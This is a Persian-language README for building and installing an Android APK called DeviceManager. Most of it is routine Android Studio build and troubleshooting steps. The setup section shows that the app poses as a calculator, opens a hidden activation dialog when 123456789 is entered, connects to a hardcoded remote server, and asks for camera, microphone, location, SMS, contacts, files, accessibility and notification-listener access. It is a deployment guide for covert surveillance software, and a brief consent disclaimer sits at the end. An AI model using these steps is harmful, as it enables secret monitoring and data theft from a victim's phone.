# راهنمای کامل ساخت APK

## پیش‌نیازها

1. **Android Studio** (آخرین نسخه)
   - دانلود از: https://developer.android.com/studio
   - حجم: حدود 1 GB
   - زمان نصب: 10-15 دقیقه

2. **JDK 17 یا بالاتر**
   - معمولاً با Android Studio نصب می‌شود

---

## مراحل ساخت APK

### مرحله 1: باز کردن پروژه

1. Android Studio را باز کنید
2. از منو: **File > Open**
3. پوشه `DeviceManager` را انتخاب کنید
4. روی **OK** کلیک کنید

### مرحله 2: Gradle Sync

1. Android Studio به‌طور خودکار Gradle Sync را شروع می‌کند
2. اگر شروع نشد، روی **Sync Now** کلیک کنید
3. **صبر کنید** تا تمام dependency ها دانلود شوند
4. اولین بار ممکن است 5-10 دقیقه طول بکشد

### مرحله 3: تنظیمات JDK (در صورت نیاز)

اگر خطای JDK دریافت کردید:

1. **File > Settings** (یا **Preferences** در Mac)
2. **Build, Execution, Deployment > Build Tools > Gradle**
3. **Gradle JDK**: انتخاب **JDK 17** یا بالاتر
4. **Apply** و **OK**

### مرحله 4: ساخت APK

#### روش 1: از منو (توصیه می‌شود)

1. **Build > Build Bundle(s) / APK(s) > Build APK(s)**
2. صبر کنید تا build تمام شود (2-5 دقیقه)
3. پیام "APK(s) generated successfully" نمایش داده می‌شود
4. روی **locate** کلیک کنید

#### روش 2: از Terminal

```bash
cd DeviceManager
./gradlew assembleDebug
```

در Windows:
```cmd
cd DeviceManager
gradlew.bat assembleDebug
```

### مرحله 5: پیدا کردن APK

فایل APK در این مسیر قرار دارد:
```
DeviceManager/app/build/outputs/apk/debug/app-debug.apk
```

---

## رفع مشکلات رایج

### خطا: "Gradle sync failed"

**راه‌حل:**
1. **File > Invalidate Caches / Restart**
2. **Invalidate and Restart** را انتخاب کنید
3. صبر کنید تا Android Studio restart شود

### خطا: "SDK not found"

**راه‌حل:**
1. **Tools > SDK Manager**
2. **Android SDK** را نصب کنید
3. حداقل **Android 13 (API 33)** را نصب کنید

### خطا: "Build failed with an exception"

**راه‌حل:**
1. پوشه‌های زیر را حذف کنید:
   - `DeviceManager/.gradle`
   - `DeviceManager/.idea`
   - `DeviceManager/build`
   - `DeviceManager/app/build`
2. Android Studio را دوباره باز کنید
3. **File > Sync Project with Gradle Files**

### خطا: "Execution failed for task ':app:mergeDebugResources'"

**راه‌حل:**
```bash
cd DeviceManager
./gradlew clean
./gradlew assembleDebug
```

---

## نصب APK روی گوشی

### روش 1: انتقال مستقیم

1. فایل `app-debug.apk` را به گوشی منتقل کنید
2. از File Manager باز کنید
3. "Install from Unknown Sources" را فعال کنید
4. روی **Install** کلیک کنید

### روش 2: از Android Studio

1. گوشی را با USB به کامپیوتر وصل کنید
2. **USB Debugging** را در گوشی فعال کنید
3. در Android Studio: **Run > Run 'app'**

---

## تنظیمات گوشی

### فعال‌سازی برنامه

1. برنامه را باز کنید (یک ماشین‌حساب می‌بینید)
2. عدد **123456789** را وارد کنید
3. دیالوگ فعال‌سازی نمایش داده می‌شود
4. آدرس سرور را وارد کنید: `http://65.109.188.172:3000`
5. روی **Connect** کلیک کنید

### دادن مجوزها

برنامه به مجوزهای زیر نیاز دارد:

- ✅ دوربین
- ✅ میکروفون
- ✅ موقعیت مکانی
- ✅ پیامک
- ✅ مخاطبین
- ✅ فایل‌ها
- ✅ Accessibility Service
- ✅ Notification Listener

**نکته:** همه مجوزها را بدهید تا برنامه کامل کار کند.

---

## مشخصات فنی

- **Package Name:** com.devicemanager
- **Min SDK:** Android 7.0 (API 24)
- **Target SDK:** Android 14 (API 34)
- **Version:** 1.0
- **Gradle:** 8.2
- **Kotlin:** 1.9.20

---

## پشتیبانی

اگر مشکلی پیش آمد:

1. لاگ‌های Android Studio را بررسی کنید
2. **Build > Clean Project** را اجرا کنید
3. **Build > Rebuild Project** را اجرا کنید
4. در صورت نیاز، پروژه را دوباره باز کنید

---

## نکات امنیتی

⚠️ **هشدار:**
- این برنامه فقط برای استفاده شخصی است
- استفاده غیرمجاز غیرقانونی است
- حتماً رضایت مالک دستگاه را داشته باشید
- اطلاعات حساس را محافظت کنید

---

**موفق باشید!** 🚀
